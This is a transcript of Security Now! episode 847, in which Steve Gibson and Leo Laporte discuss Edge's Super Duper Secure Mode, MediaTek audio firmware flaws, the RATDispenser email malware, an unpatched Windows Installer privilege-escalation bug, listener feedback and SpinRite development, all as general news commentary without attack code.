LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 847, recorded Tuesday, November 30th, 2021:  Bogons Begone!



It's time for Security Now!.  Yay, you've been waiting all week.  You're very patient.  But here we are, Tuesday again.  And here he is, fresh and ready to go, straight from the keyboard where he's been typing, typing, typing, Mr. Steven "Tiberius" Gibson.  Hello, Steve.



STEVE GIBSON:  I actually have been.  Hello, Leo.  



LEO:  I know you have.



STEVE:  I worked all through the Thanksgiving holiday and weekend until something happened that really almost never happens.  I literally hit the wall on Sunday around 2:00 or 3:00 p.m., and I posted a note to the SpinRite group, and I said, "Okay, I can't work anymore."



LEO:  Wow.



STEVE:  And so, yeah.



LEO:  It's unheard of.



STEVE:  But I've been so interested in what's going on.  I talk about it a little bit later in the podcast.  So we have a really fun podcast, I think, 847 for this last day, the final day of November, Bogons Begone!  Yes, and everyone will understand by the time we're done what bogons are to be gone.



LEO:  Oh, good.



STEVE:  Maybe.  But we've got a lot to talk about.  We're going to note that the new Edge browser's unbelievably named Super Duper Secure Mode...



LEO:  Yes.



STEVE:  ...because Microsoft certainly wouldn't want to saddle us with anything less than super duper security, has been deployed kind of quietly.  But we can all enable it.  It's not on by default, so our listeners are going to want to know all about that.  We also have more than one third, 37%, of the world's smartphones all vulnerable to audio monitoring and recording flaws courtesy of their MediaTek firmware in their MediaTek audio processing DSP.  We're going to talk about that.  We've got an important reminder about clicking links in email and wonder how that can still be a problem - it still is - and the entirely predictable evolution of a Windows zero-day vulnerability which is latent no longer, unfortunately.  We have some interesting closing-the-loop feedback from our terrific listeners.  I've got a sci-fi book update.



Then we're going to take another and much broader look at the recent efforts to clean up IPv4, but this time from the perspective of those who are working to do so.  And I understand their position.  So we talked last week about this crazy idea as a consequence of the IETF's proposal to claw back, essentially, most of the localnet 127 network.  It turns out that's just the tip of the iceberg.  So I think a really fun podcast for our listeners.



LEO:  I can't wait.  I'm excited.  As always, I look forward to this all week long.



STEVE:  Oh, and a picture.  We've got a picture, Leo.



LEO:  A picture, we've got a picture.  And now, the kitty-cat of the week.  I never thought you'd be doing cat pictures, Steve.



STEVE:  Only these particular cat pictures when they involve the nature of the universe.  I can't explain this.  It looks like a lost cat flyer, you know, Xeroxed, that used some masking tape and stuck up on a telephone pole somewhere.  The confusing thing is - and we have of course the picture of the cat, and it explains:  "Please return dead and alive to Erwin Schrodinger.  Contact shrodingercatman@gmail.com."



LEO:  Which is probably a real address.  That's hysterical.



STEVE:  That is pretty good.  So anyway, as you said, maybe this was posted in a college town.



LEO:  Has to be.



STEVE:  Over by the physics department.



LEO:  Right.



STEVE:  Yes.  So we don't want the cat dead or alive.



LEO:  Both.  Both.



STEVE:  We want it in both states simultaneously, unknown until it is observed whether the cat is in fact alive or dead.  Either way, or actually both ways, we want it returned.



Okay.  So Super Duper Secure Mode.  We previously discussed the experiment Microsoft was conducting with their Edge branch of the Chromium browser, in recognition that a disproportionate percentage of security troubles arise from the most extreme measures being used to push browser performance to the limits, and the recognition that underlying system processor performance has advanced so far recently that pushing the browser so hard that it breaks may be producing diminishing and even negative returns in terms of security.  So Microsoft began experimenting with [fanfare] Super Duper Secure Mode for Edge which deliberately pulls back on the most historically troublesome performance optimizations in favor of improved security.



Of course we're talking about it today because, without any ballyhoo, Microsoft recently quietly added Super Duper Secure Mode to Edge.  We all have it already.  It appeared in 96.0.1054.29.  And I noticed I'm already at .34 or something.  It's currently disabled by default.  To enable it, as I did, you'll need to open Edge and then put "edge://settings/privacy" into your URL.  That'll take you to the proper page.  Then you've got to scroll way down to the Security section.



At the bottom of that section on the right is a switch which you need to flip to the on position because mine was off.  And then you can choose between "Balanced" or "Strict," where Balanced is the default.  I of course switched to Strict.  Under Balanced it says "Adds security mitigations for sites you don't visit frequently.  Most sites work as expected.  Blocks security threats."  If, however, you choose Strict, as I did, it "Adds security mitigations for all sites.  Parts of sites might not work."  And I really don't know why that is, but okay.  "Blocks security threats."



LEO:  Because this isn't disabling something like NoScript would do, disabling JavaScript.  That would break sites.



STEVE:  Oh, that's, like, goodnight.  That's why we all finally had to give up on NoScript was it, like, I had to turn it on so often that it's like, what's the point any longer; you know?



LEO:  Right, right.  But this does disable, am I correct in saying Just In Time JavaScript compilation?  Is that...



STEVE:  Exactly.



LEO:  That's the thing that they said was a problem.



STEVE:  Yes.  Just In time compilation, that's the JIT, J-I-T, from the V8 processing pipeline and, for example, it also enables Intel's Control-flow Enhancement Technology (CET) which is a hardware-based exploit mitigation that provides enhanced security.  Now, based upon evidence from historical exploits, it's believed that this will significantly reduce the browser's attack surface.  Microsoft describes Super Duper Secure Mode as "a browsing mode in Microsoft Edge where the security of your browser takes priority, providing you an extra layer of protection when browsing the web."  Oh, and the one last thing, the other option there is "exceptions."  You can, if you are running in Strict, as I am now, and something did not work, you could add that as an exception.



But really, in fairness, Balanced is probably the right thing for most people.  I'm hoping that once they gain confidence in this, which is presumably the reason that little switch that you had to first turn on to enable any of this, once they gain confidence, maybe they'll flip it on by default.  Because it does make sense, if in fact Strict mode actually breaks some things - and again, why would it if it's just turning off optimizations; okay?



But the idea of watching where you go and, for example, obviously, you know, after a while Google is going to go into open mode, and the things you do most often will be automatically added to the, okay, we trust this, and it makes sense for a site you've never, that Edge has never before seen you visit to be automatically in Strict mode.  Maybe you'll never come back.  But if it's somewhere you've never been before, let's keep the shields up until we have some reason to trust the site.  So I really like the logic behind Balanced, but I imagine our listeners want to be in Strict mode.



And, you know, I'm just not seeing a performance problem on any pages I visit.  Our machines are so blazing fast now that I like this concept.  If in fact half, I think it is, no, it's 45%, 45% of all security vulnerabilities that were found in the V8 JavaScript and WebAssembly engine were related to JIT, to the Just In Time compiler.  Half of them, nearly.  So turn it off.  Unless you have something where you absolutely had that performance, turn it off.  And if you do have sites like, I don't know, web-based gaming or something where you notice not having JIT creates a lag, put that site in as an exception, and it will be fully trusted and run with full optimization.  But otherwise...



LEO:  The most difference it would make would just be performance; right?  I mean, it's...



STEVE:  Yes.



LEO:  Yeah, it probably shouldn't break anything.



STEVE:  Yes.  And it'll be interesting to see...



LEO:  Just putting that in.



STEVE:  ...and gain more experience, yes, if it actually - I would ask our listeners who often send me notes, if you run Strict and something breaks, shoot me a tweet.  I would love to know what this broke.



LEO:  Right.



STEVE:  Because this idea of half of the bad problems being shut down by backing off on crazy performance optimization, I would say it's time for that.



LEO:  Yes.



STEVE:  So bravo.  Moving forward, they plan to include support for Arbitrary Code Guard in this Super Duper Secure Mode.  ACG, they explain, is another security mitigation that would block attackers from loading malicious code into memory.  Hmm.  That sounds like a good thing.  I'll take two, please.



The Android and macOS editions of Edge will soon also be obtaining these new vulnerability mitigations.  And you put the screen shot onscreen, Leo, that shows that I immediately flipped the switch, set Strict mode, and I didn't even both putting GRC as an exception because I don't have any JavaScript on my site.  So there's nothing there to optimize.



LEO:  Just In Time, it's never a time.



STEVE:  And I don't think, like, we need the performance at the expense of security.  And so I think this was really a smart thing.  This is probably the best thing Microsoft has given back to Chromium, and it would be nice to see if it ends up getting adopted by the other browsers.



Meanwhile, we learned that 37% of the world's smartphones are vulnerable.  Chips by MediaTek are installed in roughly 37% of the world's smartphones, and Checkpoint Research recently went to all the trouble of reverse engineering the firmware of those proprietary chips.  And this is another, like, we've talked about this before.  I take my hat off to these companies that are willing to go to such extreme, to invest so much time and trouble in reverse engineering proprietary stuff that a huge percentage of the world is using.  And it feels wrong to me that the bar has been set so high, the idea that some MediaTek company can create a proprietary DSP and say, oh, yeah, don't worry, it's secure, trust us, and 37% of the smartphones in the world adopt it, and then it turns out to be a vector that is seriously putting all of those devices at risk.



And the only way we know about this is that a Robin Hood security company comes along and says, okay, well, shoot.  This is going to be hard, but we're going to do it.  They published a highly detailed technical report which showed that malicious apps installed on a device would be able to interact with the MediaTek-based audio driver.  Okay.  Apps do interact with audio drivers.  But such apps could send maliciously crafted messages via that audio driver that all apps have access to, to the MediaTek firmware to gain control over the driver and steal any audio flow going through the device, turning it into a spy device for more than one-third of the world's smartphones.  And since the MediaTek subsystem is deep in the system, exploitation of the vulnerability also allows audio from phone calls, WhatsApp calls, browser videos, and video players to be recorded.  Basically the audio in the device.



The fact that MediaTek chips are installed on roughly 37% of the world's smartphones means that this creates a massive attack surface for any malicious app and malware creator.  Devices from Xiaomi, Oppo, Realme, and Vivo are all known to use MediaTek chipsets.  And that's probably a fraction of the total.  Three issues were patched last month in October, and a fourth issue will be patched next month.



Checkpoint explained that the MediaTek chips contain a special AI processing unit - doesn't everything now - the APU, and audio digital signal processor (DSP) to improve media performance and reduce CPU usage.  But both the APU and the DSP use custom microprocessor architectures, which makes the MediaTek DSP a unique and challenging target, as I've said, for security researchers; right?  I mean, it's not just - it's not an ARM processor where they can dump the firmware and run it through a decompiler and check it out.  No.  They had to, like, reverse engineer the processor.  But they did.  They grew curious about the degree to which the MediaTek DSP could be used as an attack vector for threat actors.  So they managed to reverse engineer the audio processor and discovered a handful of security flaws.



The flaws can be updated, this is the good news, with firmware.  So keeping Android devices current continues to be as important as ever.  And while the chips remained a proprietary mystery, the likelihood of their exploitation remained low.  Unfortunately, the flipside of us finding out that there's a big problem with them is that Checkpoint's write-up is necessarily extremely detailed.  I mean, you know, if they're going to go to all this work to do all this, then they want some credit for it.



Unfortunately, this means that there is now a readily available roadmap to any technically competent miscreant who might want it, and it's got topics like "Classic heap overflow in the AUDIO_DSP_TASK_MSGA2DSHAREMEM message handler," don't you know.  We also have "Classic heap overflow in the init_share_mem_core function," and an "Improper validation of an array index in the audio_dsp_hw_open_op function."  In other words, Checkpoint has documented the problems that nobody knew, not only about, but how to exploit, and they've exploited them, and that's all out in the public now.



LEO:  [Grumbling]



STEVE:  I know, yes.  And the problem is that off-brand or unmaintained smartphones are far less likely to ever obtain updates to their MediaTek firmware.  They just won't be available.  Their manufacturers made the phone, sold the phone, and moved on to something else.  So those original vendors won't ever bother, even if their users wanted to update.  So on top of the already overwhelming number of known and never-to-be-patched vulnerabilities that are still accumulating from the past, Checkpoint has just carefully uncovered and documented another handful.  Nice that we know, but really it puts 37% of phones from non-mainstream manufacturers at further risk.  And in this case, turning them into spy devices.  And you've got to know that there are major state-level actors that are looking at this thinking, oh, let's add this to our war chest.  There may be some dissident somewhere that's got an old Xiaomi phone that they're careful not to load anything into.  But it turns out they've got a bug that they can't get rid of.  Boy.  You know?



And again, Leo, as you and I have been saying now, stick with the mainstream - Google Pixel, Samsung, Apple iOS devices.  Or obsolete your phone and stay current as often as you can.  Checkpoint, I mean, MediaTek has responded.  They were good.  They've patched their firmware.  They'll be providing the firmware to the OEMs that are using their chips to be incorporated into new devices.  But we don't have a channel now for moving backward in time at this point and reliably fixing the devices which, as we know, are handheld computers.  So it's a little worrisome.



Okay.  We have the RAT dispenser.  It's probably worth taking just a moment to reinforce the need to never, and I mean really never, click to open an attachment received in an email, any email, even if it's from your mom.  Okay.  Now, "Cybersecurity experts from HP" said they discovered a new strain of JavaScript malware that criminals are using as a way to infect systems and then deploy dangerous remote access trojans.  In other words, the remote access trojan, RAT, R-A-T, thus the RATDispenser.  But I put, Leo, "Cybersecurity experts from HP" in quotes.



LEO:  Why?



STEVE:  Because, well, try going to, and I'm serious, threatresearch.ext.hp.com.



LEO:  Okay.  The HP Wolf Security Blog.



STEVE:  And you got there somehow.  They must have just fixed this.



LEO:  Oh, it was broken? 



STEVE:  Oh, yes.  Look in the show notes.  I've got the TLS certificate that both Firefox and Google were displaying this morning.  I had to fight my way through in order to get there.



LEO:  Keep your sites up to date, kids.



STEVE:  Wow.  Let me see.  Why is it working for you?



LEO:  I mean, they may have just fixed their certificate.  Let me look at their certificate here.



STEVE:  Yeah, it came right up now.



LEO:  Yeah, they fixed it.



STEVE:  That's annoying.  Someone must have told them, probably because they were in the news.  But this morning I got both Firefox and Chrome refused.  And what I couldn't understand was that the certificate that they were serving expired on March 18th of 2021.



LEO:  Yeah, so this is from March 15th, 2021.  So they got a new one, but maybe they didn't apply it.  And it goes through 2022.  Maybe they forgot or, I don't know.



STEVE:  Right.  So they got that certificate.



LEO:  They probably didn't install it.



STEVE:  On the same cycle.  But Leo.



LEO:  But the site should have been down since last March.



STEVE:  Correct.  It could not have been offline for 10 months.



LEO:  No.



STEVE:  So something weird...



LEO:  It was a, what do they call that, a regression?



STEVE:  Yes, we do call it a regression.  It was definitely that.  Okay.  Anyway, HP explains, because they do have good researchers, they said...



LEO:  It's embarrassing if that is.



STEVE:  Oh, god, yeah.  I mean, and it's why I took a screen shot of it.  It's like, what?



LEO:  This is embarrassing.



STEVE:  And then I thought maybe Firefox.  So I went over to Chrome, and Chrome wouldn't show it either.



LEO:  Whoopsie.



STEVE:  Yeah.  Yeah.  Anyway, "Threat actors," they said, "are always looking for stealthy ways of delivering malware without being detected.  In this article we describe how attackers are using an evasive JavaScript loader that we call RATDispenser to distribute remote access Trojans and information stealers.  With only" - and this is what's really amazing - "an 11% detection rate" - meaning one out of 10 gets flagged, one out of 10 instances - "an 11% detection rate, RATDispenser appears," they wrote, "to be effective at evading security controls and delivering malware.  In total, we identified eight malware families distributed using this malware during 2021.  All the payloads were RATs (Remote Access Trojans) designed to steal information and give attackers control over victim devices.



"As with most attacks involving JavaScript malware, RATDispenser is used to gain an initial foothold on a system before launching secondary malware that establishes control over the compromised device.  Interestingly," they said, "our investigation found that RATDispenser is predominantly being used as a dropper in 94% of samples analyzed, meaning the malware doesn't communicate over the network to deliver a malicious payload."  In other words, it incorporates it.  "The variety in malware families, many of which can be purchased or downloaded freely from underground marketplaces, and the preference of malware operators to drop their payloads, suggest that the authors of RATDispenser may be operating under a malware-as-a-service business model."  Wonderful.



Okay.  So the infection chain begins with a user receiving an email containing - and I read this, and I just, like, really?  This is still happening? - a malicious attachment.  It's the classic double file extension, something like  "OrderInformation.txt.js"  which we've all known about for how long?  Yet it still works.  It still isn't being displayed properly.  It's still being handled by our email agents.  So the unwitting user simply needs to double-click the file to run the malware.  What I want to know is how is it that any of today's email clients will run such a file with a simple double-click?  This morning I just had to promise my first-born child to view this report from HP because their once-legitimate TLS certificate had expired.  I had this, like, "WARNING!  WARNING!  Do not trust this site!"



LEO:  Oh, god.



STEVE:  "Go back now."  And it's like, I look at the URL, no, it's right.  And it's like, you know, and I pressed Advanced, and it said, "Are you sure you're advanced?"  Yes.  Okay.  Do you have any children?  Will you?  Are you planning to?



LEO:  Can we have them?



STEVE:  Right, oh, my god.  But no, .txt.js, oh, wonderful, run the code.



LEO:  Oh, gosh.



STEVE:  You know, what is happening?



LEO:  Yeah.



STEVE:  We clearly have our priorities backwards.



LEO:  Yeah.  Oh, my god.



STEVE:  So HP notes that network defenders can prevent infection at the enterprise level by blocking executable file attachment file types from passing through their email gateways, for example, JavaScript or VBScript.  What a concept.  Defenders, they said, can also interrupt the execution of the malware by changing the default file handler for JavaScript files, only allowing digitally signed scripts to run, or disabling Windows Script Host.  Okay.  But I ask why any of that is even necessary.  It won't protect anyone outside of those enterprise boundaries; right?  The standard default is you click on something .js, we don't care where it came from, we don't care how it got into your system, you want it, you got it.  It's crazy.



When the malware runs, the JavaScript decodes itself at runtime because of course it's all heavily obfuscated.  It's just a bunch of /hex codes behind some evals.  And that writes a VBScript file to the %TEMP% folder using cmd.exe.  To do this, the cmd.exe process is passed a long, chained argument, parts of which are written to the new file using the echo function.  Then the VBScript file runs to download - oh, it is downloading the malware payload from somewhere.  If it was downloaded successfully, it's executed, and the VBScript file is deleted.  So it's like, oh, we got what we wanted.  Now delete this.  Again, how can it be that you're not allowed to visit a site whose certificate has expired?  Yet click on a link in email, run some code, no problem.



The initial JavaScript downloader is obfuscated and contains several eval functions, as I mentioned.  One of the eval calls is a function that returns a long string, which is decoded by another function.  And it's clearly effective since only, as I said, about one out of every 10 instances, well, 11%, that's one out of nine, are now being detected after many months of successful exploitation.  



Over the past three months, HP said the malware had been used to drop at least eight different RAT strains, such as STTRAT; WSH, we know what that stands for, RAT; AdWind; Formbook; Remcos; Panda Stealer; GuLoader; and Ratty.



LEO:  Love the names, wow.



STEVE:  Yeah, the Ratty RAT.  As I started out saying, it's worth just refreshing the strength of the prohibition against ever clicking on anything that is received in email.  Really.  I mean, these guys are clever.  They're going out of their way to avoid the protections built into our systems.  It's dispiriting that it is still possible to do this today.  But it is.



Okay.  So we have an entirely predictable zero-day Windows exploit.  Right on...



LEO:  Of course.  I'm sorry.  I shouldn't laugh.  I shouldn't laugh.



STEVE:  I know.  I know.  It's just so sad because, again, our listeners will be right there with us.  Right on schedule, Cisco's Talos group discovered the active exploitation of a zero-day elevation of privilege vulnerability in Microsoft Windows Installer.  This vulnerability allows an attacker with a limited user account to elevate their privileges to become an admin.  The vulnerability affects every version of Microsoft Windows, including fully patched Windows 11 and Server 2022.  Talos detected malware in the wild taking advantage of this vulnerability.



What was entirely predictable about this?  We've been tracking this one for some time.  Microsoft was first informed of the fundamental underlying problem by security researcher Abdelhamid Naceri, who discovered this elevation of privilege vulnerability and worked with Microsoft to address it.  However, when Naceri examined Microsoft's supposed patch for this, following this month's Patch Tuesday, he discovered, oh, what do you know, Microsoft had merely patched against the proof of concept that he had provided, rather than addressing and repairing the underlying flaw.



To demonstrate that, Naceri then published proof-of-concept exploit code on GitHub on November 22nd, eight days ago, which works despite the fixes implemented by Microsoft because Microsoft didn't fix the problem.  They just broke his proof of concept.  The code Naceri released leverages the Discretionary Access Control List, the so-called DACL, for Microsoft Edge Elevation Service to replace any executable file on the system with an MSI file, which is a Microsoft installer, a setup installer file, allowing an attacker to run code as an administrator to gain full control over the compromised system, including the ability to download additional software, modify, delete, or exfiltrate sensitive information stored in the machine.



Independent security researcher Kevin Beaumont, who tweets as Gossi the Dog, tweeted:  "Can confirm this works, local priv esc.  Tested on Windows 10 21H2 and Windows 11.  The prior patch MS issued didn't fix the issue properly."  Naceri noted that the latest variant of this 2021-41379, which was the CVE assigned to this, is more powerful than the original one, and that the best course of action would be to wait for Microsoft to release a security patch for the problem due to the complexity of the vulnerability.  Apparently this is not something that even the 0patch guys can offer a quick fix for because he says there's a great likelihood of breaking something.



So what do we have?  A security researcher responsibly and privately reports a serious problem to Microsoft, including a proof-of-concept demonstration.  Microsoft responds, not by fixing the problem, but by breaking the security researcher's proof of concept, claiming that the problem has been fixed.  Annoyed, the security researcher then publicly posts another proof of concept to demonstrate that Microsoft actually fixed nothing.  Somewhere, this is seen as good news as malware authors jump on this now public and well-documented unpatched vulnerability in Windows, using it to obtain admin rights on Windows machines.



We're all now living with the consequences of Microsoft's deliberate de-emphasis of Windows' pre-release testing, which has been much talked about here and over on Windows Weekly.  Unfortunately, it appears that post-release vulnerability patching has also been de-emphasized.  Wow.  And Cisco found this being used.  Maybe we'll get an emergency fix.  Maybe we wait till December's Patch Tuesday.  Unfortunately, this being the 30th and tomorrow being the 1st, December is one of those, of 2021, one of those months where the Patch Tuesday is halfway through the month, right, it's on the 14th.  So we'll be waiting as long as we possibly could be.



Okay.  Not much else of interest happened.  And as I said, I'm going to talk a lot about the begoneness of bogons shortly.  I did want to provide those listeners who may not have been tracking the Frontiers saga, as I certainly have been, with an update.  The first of 15 next books in Ryk Brown's third 15-book story arc launched on Thanksgiving.  Actually it came out on Wednesday of last week, the day before Thanksgiving, titled "Fringe Worlds," that is, this sequence will be "Fringe Worlds."



Ryk, as I mentioned before, spells his name R-Y-K, is no fan of Kindle Unlimited, feeling that it doesn't fairly reward authors for their work.  In his announcement email he said that the book would not be on Kindle Unlimited, but would be for sale for $3 for at least a few months, after which he would then put it on Kindle Unlimited.  And I would have happily paid $3 for all the hours of pleasant relaxation I obtain from his writing.  But I just checked, and there it was on Kindle Unlimited.  It's kind of hard to find.  So I put a link to it in the show notes for anybody who has been following along and reading the first 30 books, as I have, of the Frontiers saga.  



I'm at this moment finishing up my complete re-read of Ryk's first 30 books.  I'm on the last one of the first 30.  But then I plan to finally see what the Bobiverse series is all about.  Our listeners are huge fans of this Bobiverse.  So that'll be what I do next.  However, I have to confess that my recent reading progress has been really retarded because I have truly become fully engaged in the work on SpinRite.  I go to sleep thinking about it, I awaken thinking about it, and I'm thinking about it right now.



LEO:  Good man.  Everybody's very happy to hear that.



STEVE:  I know.



LEO:  That's excellent.



STEVE:  Yeah, that's all I want to do because I'm becoming very excited about what it is becoming.  I won't go into detail that I did go into detail in my posting to the group because in this last week I ended up developing, and I'm going to try not to go into detail, a heuristic system for statistically determining which interrupt request lines specific controllers and adapters were using.  After we learned that they were lying and that I couldn't rely on what they were saying, it was necessary to get, you know, everybody else would say AI.  Well, it's not AI.  But it works, apparently.



So anyway, it's a big challenge.  I'm having a ball.  But I guess I'm becoming excited about what it's becoming.  For one thing, it's guaranteeing me highly engaging full employment for the next several years as I publish successively more capable versions.  When I watch its new benchmarks run, the non-uniformity of performance that is very clear as the numbers flash on the screen across both spinning and solid-state memory surfaces is, well, it's bracing.  I mean, most people probably won't appreciate what that means.  But if you're reading successive 64, wait, no, 32MB blocks from a spinning hard disk, and they are end to end, they ought to have the same timing or be slowly slowing down as you move gradually toward the center, like toward the center of the disk.  That's not what I see.  I see clear timing changes which mean that there's a problem there that the drive had to pause and work on for a while.



And what really surprised us was when we did the ReadSpeed Benchmark, and we saw that our solid-state RAM was not behaving like we would expect solid-state RAM.  It's behaving like a bunch of leaky buckets.  And in fact, as we know, that's exactly what it is.  So I cannot wait to get to the point where SpinRite will have the ability to zero in on spots that it has discovered are reluctant to be read.  In the case of solid-state memory, what's happening is the electrostatic charge of individual bits are leaking, losing their certainty, thus requiring more work and time to be read.  SpinRite will be able to detect that and selectively rewrite just those leaky trouble spots to recharge them before any data is lost.  And of course if there's any actual media damage, SpinRite will demonstrate that to the media's controller, enabling it to relocate the data to keep it safe.



And there's a lot of work yet to be done before we'll be there.  I love the work.  I need to get version 6.1 out to satisfy the immediate needs of everyone who has it while I keep working.  Then SpinRite needs to be moved away from DOS over to the OnTime RTOS-32 kernel for operation on either BIOS or UEFI.  Then native drivers for USB and NVMe need to be added to that environment.  But all of the work I've been doing basically rewriting SpinRite is in preparation for that.  Those will just be drop-in now, thanks to the fact that I've got this object-oriented I/O system which is now up and running and is proven.  And at that point, when that's done, I'll be at a place where we can finally start to develop an entirely new media surface analysis system.  So, yeah.  If I sound excited, it's true.



LEO:  Good.  We're excited, too.  That's great.



STEVE:  Yeah.  And with any luck there'll still be a podcast here.  So I'm going as fast as I can.



LEO:  Take your time.  It's okay.  Just don't get distracted.  Focus, focus, focus.



STEVE:  Well, I did, literally, I saw, I induced a problem on Sunday where I forced ATA drives to be recognized as IDE in order to verify a code path that wouldn't otherwise be used, but could be.  And the tricky part of SpinRite which figures out which BIOS identifiers are connected to which hardware drives, it failed to - it's called the associator because it associates them.  We need to know which items have already been found for direct SpinRite access and which ones will still have to go through the BIOS.  If I don't associate them, then they'll show up as both a BIOS-accessible drive and as something that SpinRite can access, and that'll just be confusing to users.



So SpinRite is maintaining the same ease of use it's always had, and I'm taking responsibility for making that, for holding onto that ease of use.  Anyway, when I forced ATA drives to be recognized as IDE, the associator didn't function.  And I looked at it, and I just thought, okay.  I'm out.  I'm done.  I've hit the wall.  I went home early, at like 3:00.  And Lorrie said, "Honey, you're home early."  I said, "Yeah, I ran out of steam."



LEO:  Burned out.  That's fine.



STEVE:  But yesterday morning I sat down, looked at the problem, and solved it.



LEO:  See?  Just one good night's sleep.



STEVE:  Before I started working on the podcast.



LEO:  I'm curious because I don't do any real programming, but I like these programming problems.



STEVE:  Well, you're about to do the whole programming...



LEO:  The Advent of Code, yeah, yeah.



STEVE:  The Advent of Code; right.



LEO:  So what I've noticed - and as a warm-up I was just doing a previous year's for the last few days.



STEVE:  Cool.



LEO:  And what I noticed is if I can't - I'm looking at something and I don't know what's wrong, or I can't think of how to solve it, if I go to bed, I will think about it, it processes, and I'll wake up and go, okay.  So you're saying that's what happened, kind of?



STEVE:  Yeah.



LEO:  Or just getting some rest.



STEVE:  No, but I do know that phenomenon.  A few days ago in the shower I realized there was a way to further improve the code that I was working on.



LEO:  I have a theory about this because I always come up with the best stuff in the shower.  I think the heat of the shower gets the blood vessels going or something, and relaxed, and you think better in the shower because you're right, always where the best ideas.



STEVE:  Yeah.



LEO:  Don't know why.  It's strange.



STEVE:  Thus, yes, our water company in Southern California is saying, you know, Steve, there is a drought on.  And we realize you're looking for some good ideas.  But really, stop.  Is there nowhere else you...



LEO:  Tavis Ormandy came up with a solution in the shower, I seem to remember, right, way back when from Google's Project Zero.



STEVE:  Yes.  Indeed he did.



LEO:  So it is a real phenomenon.  I don't understand it.



STEVE:  And is well known to programmers the world over.



LEO:  Oh, yeah.  I love it, though, going to sleep.  Because as I'm drifting off, the problem will be going around in my head.



STEVE:  Yup.



LEO:  And  just somehow my brain just keeps working on it, I guess all night.  And in the morning, bing.  Pops right out.



STEVE:  There it is.



LEO:  Yup.



STEVE:  So we have some fun feedback from our listeners.  David Wright, he tweeted:  "Another month, another Microsoft balls-up.  Windows Server updates this month kick Exchange in the teeth.  Some part of the update doesn't have the correct privileges, so a certificate doesn't get updated, and you can't access Exchange control panel or OWA, et cetera, afterwards.  That was a great start to Monday morning, after updating over the weekend.  Everything seemed to go through smoothly,"  he said, "(mails going in and out after the update, but only through automated SMTP).  Once the users started coming into work, things went downhill."  So yes, David, there's a tweet from the field.



Bob Thomas said:  "@SGgrc Any word on Microsoft plans on fixing network printing?  I can't print any other way.  I got notice to update, and it was horrible.  No printing, and I could not tell which update of three was responsible.  Until all uninstalled, and then the printer printed.  PO'd at Microsoft!"



And I assume Bob meant that he had no choice other than to print over a network.  There's news that the promised fix for printing has been released into broader testing; and assuming that all goes well, it should be December 14th.  So fingers crossed.  I think probably by the year end we're going to get printing as a Christmas present from Microsoft.



Rick Nyman tweeted:  "In Microsoft's defense regarding JavaScript in Excel, they are playing catch-up to Google, who has had JavaScript-based Google Apps Script in Sheets for a long time.  Microsoft needs to replace VBA with something current.  But yes, I hope they can secure it."



Donn Edwards tweeted:  "Hi, Steve.  Happy Thanksgiving.  Is the IETF going to allocate the 0.0.0.0 address space as well?"  He says:  "Windows uses 0.0.0.0 in the hosts file in the same way it uses 127.0.0.1.  What could possibly go wrong?"  And I think maybe Donn meant the routing table because, if you do a print route, you will see 0.0.0.0 is also locked down.



Someone whose Twitter name currently, he tends to change it,  it's 418:  Tea Ready.  And of course those with a long memory will remember that there are some bizarrely named HTTP errors.  There's the 404, which is Page Not Found.  Anyway, 418, Gary reminds us, is Tea Ready.  Anyway, he was replying to @nixcraft.  And Gary said:  "It appears you have a copy of SpinRite by @SGgrc relabeled as Norton Disk Doctor.  How did that happen?"



LEO:  Well, we know the story, don't we.



STEVE:  Yes, we do.  I mean, it was - they stole it.  And it was such a clone that it even looks the same, so much so that Gary, who owns SpinRite and is one of our testers, looked at it and said, "How do you have SpinRite labeled Norton Disk Doctor?"



LEO:  Well, now we know.



STEVE:  I wonder.  That's right.



LEO:  They don't still sell that, I think.  They haven't...



STEVE:  Oh, no.  No, in fact, they abandoned it like maybe after a year because their own tech support, since they hadn't written it, their own tech support couldn't support it.



LEO:  Oh.



STEVE:  And so we were getting support calls from people with Norton Disk Doctor saying, yeah, Norton told us to call you because, you know, we got Norton Utilities, and now it has SpinRite built in.  I said, "No, it doesn't."



LEO:  They approached you; right?  They wanted to buy it.



STEVE:  Yes.  And it was not Peter's fault.  For the record, I want everyone to know Peter Norton is a nice guy.  It was Ron Posner who was the heart of darkness.



LEO:  Oh, legendary heart of darkness, yes.



STEVE:  Yes.  And so Peter and I went to lunch, with Peter having the instructions to get SpinRite from Steve.  And he paid me a great compliment, Peter did.  He said, "You know, Steve, when I heard you were low-level reformatting hard drives on the fly," he said, because he was in Santa Monica, he said, "I thought I was going to look to the south, down there toward Irvine, and see a mushroom cloud because you can't, you know, really?  You're nuts.  But apparently you've managed to do it somehow, and it's the number one most requested feature at Norton Utilities is everybody wants SpinRite, and they don't  want to have to buy it again, don't have to buy it from you and buy Norton Utilities from me.  So we just want to buy SpinRite from you, and everybody will be happy."



I said, "Except me, Peter."  I said, "Unless you're willing to pay a ridiculous amount of money, I'm not selling."  And he said, "How ridiculous?"  I said, "Really ridiculous.  It's like we're not even going to talk about it."  And he said, "Really?  You're sure?"  I said, "I'm sure."  So we went back and met with Ron Posner, and we walked into Ron's office, Peter and I, and Ron said, "So, we got a deal?"  And Peter looked like the dog that had been bad.  I mean, he was like he was - he didn't do it.  And Peter said no.  Then Ron said, "Why not?"  Because, I mean, they figured they were on top of the world.



LEO:  Oh, yeah, yeah, yeah.



STEVE:  And how could this little weenie named Steve Gibson...



LEO:  Yeah, why would you turn that down, yeah.



STEVE:  Yeah, this little guy who was trying to scratch together some coin.  And anyway, saying no was the best decision I ever made.  So, you know, again, they ended up abandoning it.  And in fact today is Greg, my support guy's 31-year anniversary.



LEO:  No.  With you?



STEVE:  Working with me.



LEO:  Holy cow.  That's kind of a legend.



STEVE:  And Sue is several years before that.  So both of them...



LEO:  Oh, man.  You keep the good ones.  That's the point.



STEVE:  More than, yeah, I had two.



LEO:  At your peak, how big was SpinRite?



STEVE:  23.



LEO:  Yeah.



STEVE:  I remember we had 23 people because on Black Monday, as they called it, I reduced us from 23 to 12 by lunch.



LEO:  Wow, that's not a fun time.



STEVE:  It was not good.



LEO:  No.



STEVE:  No.



LEO:  Anybody who's ever owned a business knows that's the absolute worst part of any business.



STEVE:  Yeah.



LEO:  But I'm sure a relief afterwards, you know.



STEVE:  It had gotten out of control.  And they didn't think I was in touch with what was going on.  I remember one of them at the back in our group, we met at lunch, and actually his name was Richard, he said, "Who's next?"  And I said, "I heard that, Richard."  And I said, "Now..."



LEO:  Guess who?



